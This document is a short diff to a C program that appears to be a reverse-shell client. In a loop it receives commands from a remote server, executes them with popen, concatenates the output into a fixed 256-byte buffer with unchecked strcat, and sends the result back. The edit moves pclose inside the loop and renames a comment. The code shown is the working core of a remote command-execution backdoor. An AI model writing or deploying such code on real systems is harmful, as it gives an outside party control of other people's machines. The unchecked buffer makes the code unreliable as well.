@@ -39,7 +39,7 @@ int main(){
     char fullOutput[256] = {0};
 
     while (true){
-        // Printing server response
+        // Receiving server message
         recv(networkSocket, &serverResponse, sizeof(serverResponse), 0);
         
         // IF server sends "exit", we close the application
@@ -51,11 +51,12 @@ int main(){
         // Execute commands
         if (serverResponse[0] != 0){
             processRead = popen(serverResponse,"r");
-            
+
             // Concatenate the output and send to the server
             while(fgets(clientOutput, sizeof(clientOutput), processRead) != NULL){
                 strcat(fullOutput, clientOutput);
             }
+            pclose(processRead);
             send(networkSocket, fullOutput, sizeof(fullOutput), 0);
             strcpy(fullOutput,"");
             strcpy(clientOutput,"");
@@ -64,7 +65,6 @@ int main(){
 
     // Cleanup
     close(networkSocket);
-    pclose(processRead);
 
     return 0;
 }
